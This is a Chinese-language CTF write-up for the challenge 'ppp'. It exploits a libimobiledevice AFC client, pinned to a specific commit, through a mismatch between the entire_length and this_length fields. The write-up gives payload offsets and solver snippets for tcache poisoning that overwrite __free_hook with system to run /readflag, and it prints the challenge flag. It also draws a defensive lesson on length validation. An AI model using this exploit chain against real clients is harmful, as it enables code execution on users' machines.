# ppp

## 题目简述

服务端运行基于 `libimobiledevice` 的交互式 AFC 客户端，玩家连接后扮演不可信的 iOS 设备：先输入 `ls`、`rm` 等客户端命令，再返回对应的 AFC 响应。目标是攻击“主动发起请求的一方”，向 AFC 客户端发送恶意长度字段并取得代码执行。

Dockerfile 固定 `libimobiledevice` 提交 `fa0f79190142bc309307967c058f89c1b36eb6b8`，运行在 Ubuntu 20.04；jail 配置允许 `personality` 并设置 `persona_addr_no_randomize: true`，所以官方解直接使用固定 libc 基址，不需要额外泄露。

## 解题过程

### 1. `afc_receive_data()` 的长度不一致

AFC 头长 `0x28`，同时包含整包长度 `entire_length` 和当前块长度 `this_length`。固定版本的 [`afc_receive_data()`](https://github.com/libimobiledevice/libimobiledevice/blob/fa0f79190142bc309307967c058f89c1b36eb6b8/src/afc.c) 先分别减去头长：

```c
entire_len = (uint32_t)header.entire_length - sizeof(AFCPacket);
this_len = (uint32_t)header.this_length - sizeof(AFCPacket);
buf = malloc(entire_len);

if (this_len > 0)
    service_receive(client->parent, buf, this_len, &recv_len);
```

代码只检查 `this_length >= sizeof(AFCPacket)`，却没有验证：

```text
this_length <= entire_length
```

因此可以按 `entire_len` 分配、按更大的 `this_len` 接收。官方 `pkt()` 的参数不含 `0x28` 字节头，第二个响应使用：

```text
entire_len = 0x20  -> header.entire_length = 0x48
this_len   = 0x78  -> header.this_length   = 0xa0
```

于是 `malloc(0x20)` 返回 `0x30` chunk，却接收 `0x78` 字节，越界 `0x58` 字节。由于 `entire_len > this_len` 为假，后续补包循环不会执行，函数直接把 `current_count` 设为 `0x78`，攻击包会被当作完整 AFC 数据。

### 2. 第一个 `ls`：填充 `0x20` tcache

响应头还必须满足：

- magic 为 `CFA6LPAA`；
- `packet_num` 等于客户端当前序号；
- `operation` 为 `AFC_OP_DATA`，即 2。

第一次 `ls /` 返回 6 个 `BBBB\0`，总 payload 为 30 字节。AFC 原始 buffer 落入 `0x30` chunk；目录解析又为 6 个短文件名执行 `strdup()`，得到 6 个 `0x20` chunk。`print_names()` 最后逆序释放这些字符串，在 glibc 2.31 的 `0x20` tcache 中形成可预测 freelist。

### 3. 第二个 `rm`：覆盖 tcache `fd`

第二次 `rm /x` 让 `malloc(0x20)` 复用前一轮释放的 `0x30` AFC buffer，再用长度不一致触发越界。payload 的关键位置为：

```python
poison = bytearray(b"P" * 0x78)
poison[0x68:0x70] = p64(0x21)
poison[0x70:0x78] = p64(FREE_HOOK)
```

偏移 `0x68` 保持相邻 `strdup` chunk 的 size 为 `0x21`，偏移 `0x70` 把 `0x20` tcache 头结点的 `fd` 改成 `__free_hook`。目标 glibc 2.31 尚无 safe-linking，因此这里写入裸地址即可。

### 4. 第三个 `ls`：写 hook 并触发

ASLR 已由 jail 关闭，solver 使用固定的：

```python
LIBC_BASE = 0x7ffff7d65000
FREE_HOOK = LIBC_BASE + libc.symbols["__free_hook"]
SYSTEM = LIBC_BASE + libc.symbols["system"]
```

第三个 `ls /` 返回三个 NUL 结尾的目录项：

```python
name0 = b"/readflag sekai ppp\x00"
name1 = p64(SYSTEM).rstrip(b"\x00") + b"\x00"
name2 = b"A" * 0x18 + b"\x00"
```

解析目录项时，`name0` 的 `strdup()` 取出被污染的 tcache chunk，下一次 `strdup(name1)` 返回 `__free_hook` 并把 `system` 地址写入其中。随后 `free_list()` 清理目录项；当命令字符串对应的 chunk 被释放时，调用变成：

```c
system("/readflag sekai ppp");
```

三次客户端命令和响应序号必须同步：

```text
ls /  + flood  (packet_num=1)
rm /x + poison (packet_num=2)
ls /  + trigger(packet_num=3)
```

最终得到：

```text
SEKAI{du_bist_gut_genuggggggggggggg}
```

## 方法总结

处理网络包时，分别验证两个长度“各自看起来合法”并不够，还必须验证它们之间的关系。这里应在任何分配和接收前保证 `sizeof(AFCPacket) <= this_length <= entire_length`，并对转换到 32 位后的值检查截断与减法下溢。

利用层面还要先检查运行环境，而不是机械地加入 libc 泄露：本题明确关闭 ASLR、固定 libc，并使用无 safe-linking 的 glibc 2.31，所以最短路径就是一次线性溢出覆盖裸 tcache `fd`，再以 `__free_hook -> system` 收尾。面向客户端的协议同样属于攻击面，远端“设备”返回的数据必须视为不可信。
